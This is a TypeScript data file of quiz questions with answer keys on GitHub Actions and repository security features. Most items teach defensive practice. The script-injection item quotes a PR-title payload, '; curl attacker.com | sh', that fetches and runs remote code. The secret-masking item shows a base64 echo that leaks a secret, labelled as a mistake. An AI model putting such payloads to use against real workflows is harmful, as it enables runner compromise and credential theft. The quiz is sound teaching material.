import { Question } from '@/types/question';

const questions: Question[] = [
  {
    id: 'git-github-l4-001',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'What is OpenID Connect (OIDC) in GitHub Actions and why is it preferred over long-lived secrets for cloud deployments?',
    options: [
      'It is a way to sign commits using a cloud key management service',
      'GitHub issues a short-lived OIDC token per workflow run; cloud providers exchange it for scoped credentials, eliminating stored secrets entirely',
      'It is a GitHub Actions runner authentication protocol for self-hosted machines',
      'It is a way to share secrets between GitHub organisations',
    ],
    correctAnswer: 1,
    explanation: 'OIDC federation means no cloud credentials are stored as GitHub secrets: the cloud IAM verifies the JWT token GitHub issues per-run, granting temporary scoped access.',
    codeSnippet: 'permissions:\n  id-token: write\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v4\n    with:\n      role-to-assume: arn:aws:iam::123:role/github-actions\n      aws-region: us-east-1',
    tags: ['git', 'github-actions', 'oidc', 'security', 'cloud'],
  },
  {
    id: 'git-github-l4-002',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'A workflow uses a third-party action pinned to @main. Why is this a supply chain security risk, and what is the recommended fix?',
    options: [
      'Using @main is slower than using a version tag',
      'The action\'s code can change without notice at any commit, so an attacker who compromises the upstream repo can inject malicious code; pin to a full commit SHA instead',
      'GitHub blocks actions pinned to @main in private repositories',
      'The @main ref is not supported in reusable workflows',
    ],
    correctAnswer: 1,
    explanation: 'Mutable refs (main, v1) can be updated by upstream owners; pinning to an immutable SHA (e.g., uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683) guarantees the exact code version.',
    codeSnippet: '# Bad:\n- uses: third-party/action@main\n# Good:\n- uses: third-party/action@a1b2c3d4e5f6...  # v2.3.1',
    tags: ['git', 'github-actions', 'supply-chain', 'security', 'pin'],
  },
  {
    id: 'git-github-l4-003',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'What is script injection in GitHub Actions and which context expression is most dangerous?',
    options: [
      'Injecting shell commands via the run: step; github.token is most dangerous',
      'Using user-controlled data like github.event.pull_request.title in a run: shell script; an attacker can include shell metacharacters to execute arbitrary code on the runner',
      'Overwriting the GITHUB_OUTPUT file with malicious content',
      'Injecting environment variables through actions/cache',
    ],
    correctAnswer: 1,
    explanation: 'Expressions like ${{ github.event.pull_request.title }} are expanded before the shell parses the script; a PR title containing `; curl attacker.com | sh` runs arbitrary commands.',
    codeSnippet: '# Vulnerable:\n- run: echo "Title: \${{ github.event.pull_request.title }}"\n# Safe: use env var:\n- env:\n    TITLE: \${{ github.event.pull_request.title }}\n  run: echo "Title: \$TITLE"',
    tags: ['git', 'github-actions', 'script-injection', 'security'],
  },
  {
    id: 'git-github-l4-004',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'How do you create a composite action and what advantage does it have over a reusable workflow?',
    options: [
      'A composite action is defined in an action.yml with runs.using: composite; it is invoked as a step (uses:) rather than a job, so it inherits the caller\'s runner and job context',
      'A composite action is identical to a reusable workflow but stored in .github/actions/',
      'A composite action runs in a separate virtual machine',
      'Composite actions can only be used in public repositories',
    ],
    correctAnswer: 0,
    explanation: 'Composite actions bundle multiple steps into a reusable unit called at the step level — they share the runner context (environment, file system) with the caller, unlike reusable workflows which run as separate jobs.',
    codeSnippet: '# action.yml\nruns:\n  using: composite\n  steps:\n    - run: npm ci\n      shell: bash',
    tags: ['git', 'github-actions', 'composite-action', 'reusable'],
  },
  {
    id: 'git-github-l4-005',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'branch rules',
    question: 'In GitHub Rulesets, what does the "bypass actors" list allow?',
    options: [
      'A list of users whose PRs auto-merge without review',
      'Specific roles, teams, or apps that are exempt from the ruleset requirements, enabling break-glass access',
      'A list of bots excluded from status check requirements',
      'GitHub staff who can override any rule',
    ],
    correctAnswer: 1,
    explanation: 'Bypass actors provide an escape hatch for incident response or automation: designated actors can push, force-push, or bypass review requirements when absolutely necessary.',
    tags: ['git', 'github', 'rulesets', 'bypass-actors', 'security'],
  },
  {
    id: 'git-github-l4-006',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'merge queue',
    question: 'What is "speculative merging" in the context of a GitHub Merge Queue?',
    options: [
      'Testing a PR in isolation before it joins the queue',
      'Testing multiple queued PRs in parallel by assuming they will all pass, rolling back failures — reduces queue wait time at the cost of occasional rollback',
      'Auto-merging all PRs that have been waiting more than 24 hours',
      'A mode where the queue skips CI for trivial changes',
    ],
    correctAnswer: 1,
    explanation: 'With speculative merging enabled, the queue tests groups of PRs simultaneously; if any fails, the group is split and retested serially. This reduces average wait time on busy repos.',
    tags: ['git', 'merge-queue', 'speculative-merge', 'performance'],
  },
  {
    id: 'git-github-l4-007',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'Dependabot',
    question: 'How does Dependabot handle transitive (indirect) dependency vulnerabilities in npm projects?',
    options: [
      'It only updates direct dependencies listed in package.json',
      'It creates PRs that bump the vulnerable transitive package in package-lock.json via npm install --save-exact, even if package.json does not directly list it',
      'It alerts you but cannot create PRs for transitive dependencies',
      'It removes the dependency that pulls in the vulnerable transitive package',
    ],
    correctAnswer: 1,
    explanation: 'Dependabot security updates work on the lockfile level for transitive vulnerabilities, bumping the affected nested dependency to a safe version without necessarily changing the direct dependency range.',
    tags: ['git', 'github', 'dependabot', 'transitive', 'security'],
  },
  {
    id: 'git-github-l4-008',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'You want a GitHub Actions workflow to push a Docker image to a registry and then update a GitOps repository with the new image tag. Which permissions model is most secure?',
    options: [
      'Store registry and GitOps repo tokens as repository secrets',
      'Use OIDC to authenticate to the registry (no stored secret) and a GitHub App installation token to write to the GitOps repo (scoped, short-lived)',
      'Use a single admin PAT for both operations',
      'Grant the workflow write access to all repositories in the organisation',
    ],
    correctAnswer: 1,
    explanation: 'OIDC eliminates stored registry credentials; a GitHub App issues short-lived, repository-scoped tokens for the GitOps write operation — both follow least-privilege and zero-standing-secrets principles.',
    codeSnippet: '- uses: aws-actions/configure-aws-credentials@v4\n  with:\n    role-to-assume: \${{ secrets.ECR_ROLE }}\n- uses: actions/create-github-app-token@v1\n  with:\n    app-id: \${{ secrets.APP_ID }}\n    private-key: \${{ secrets.APP_PRIVATE_KEY }}',
    tags: ['git', 'github-actions', 'oidc', 'github-app', 'security', 'gitops'],
  },
  {
    id: 'git-github-l4-009',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'CODEOWNERS',
    question: 'How can you configure CODEOWNERS so that a specific team is required to review, but another team\'s review is optional/additive?',
    options: [
      'CODEOWNERS does not support optional reviewers',
      'List the required team normally; add the optional team with a # comment — only CODEOWNERS-listed entries are auto-requested',
      'CODEOWNERS makes all listed owners required when branch protection is set to "Require review from Code Owners"; teams not listed in CODEOWNERS can still be manually added as optional reviewers',
      'Prefix optional owners with ~ in the CODEOWNERS file',
    ],
    correctAnswer: 2,
    explanation: 'With "Require review from Code Owners" enabled, only CODEOWNERS-listed owners are mandatory; anyone else added manually to the PR as a reviewer is optional.',
    codeSnippet: '# .github/CODEOWNERS\nsrc/payments/ @payments-team          # required\n# @optional-team not listed = optional',
    tags: ['git', 'github', 'codeowners', 'required-review', 'optional'],
  },
  {
    id: 'git-github-l4-010',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'How do you limit a self-hosted runner to specific workflows or repositories to reduce the blast radius of a compromised runner?',
    options: [
      'Run the runner with --restricted flag',
      'Register it at the repository level (not org level) and use runs-on labels tied to those runners, combined with restricting which workflows can use environment-scoped runners',
      'Set max-workflows: 1 in the runner configuration',
      'Self-hosted runners cannot be scoped; use GitHub-hosted runners instead',
    ],
    correctAnswer: 1,
    explanation: 'Repository-scoped runners, environment deployment gates, and fine-grained runner group policies together constrain which jobs can use a self-hosted runner, limiting lateral movement if compromised.',
    tags: ['git', 'github-actions', 'self-hosted-runner', 'security', 'scope'],
  },
  {
    id: 'git-github-l4-011',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'What is the pull_request_target event and why does it pose a security risk?',
    options: [
      'It is identical to pull_request but triggers only on target-branch pushes',
      'It runs the workflow in the context of the base repository (with full secrets) even when triggered by a fork PR — an attacker can modify the workflow file in their fork to exfiltrate secrets',
      'It only works for internal PRs, not forks',
      'It triggers after the PR is merged rather than when it is opened',
    ],
    correctAnswer: 1,
    explanation: 'pull_request_target grants access to secrets and writable GITHUB_TOKEN with base-repo permissions; if the workflow checks out fork code and runs it, malicious fork changes can access those secrets.',
    codeSnippet: '# Dangerous pattern:\non: pull_request_target\nsteps:\n  - uses: actions/checkout@v4\n    with:\n      ref: \${{ github.event.pull_request.head.sha }}  # checks out fork code!',
    tags: ['git', 'github-actions', 'pull_request_target', 'security', 'forks'],
  },
  {
    id: 'git-github-l4-012',
    language: 'git',
    level: 'level4',
    category: 'GitHub/GitLab Features',
    subcategory: 'GitHub Actions',
    question: 'How does GitHub Actions handle secrets in workflow run logs, and what is a common mistake that bypasses this protection?',
    options: [
      'All environment variables are automatically masked; there are no bypasses',
      'Known secret values are masked in logs with ***; but encoding the secret (base64, hex, splitting across steps) produces a variant not registered with the masker',
      'Secrets are hashed before being inserted into logs',
      'Secrets are masked only in GITHUB_STEP_SUMMARY, not in step logs',
    ],
    correctAnswer: 1,
    explanation: 'GitHub registers the literal secret value for masking; transforming it (e.g., echo $SECRET | base64) produces an unmasked derivative, so transformed secrets can leak even when the raw value is protected.',
    codeSnippet: '# Leaks the secret:\n- run: echo "\${{ secrets.TOKEN }}" | base64\n# Masked value \'abc\' is not the same as \'YWJj\'',
    tags: ['git', 'github-actions', 'secrets', 'masking', 'security'],
  },
];

export default questions;
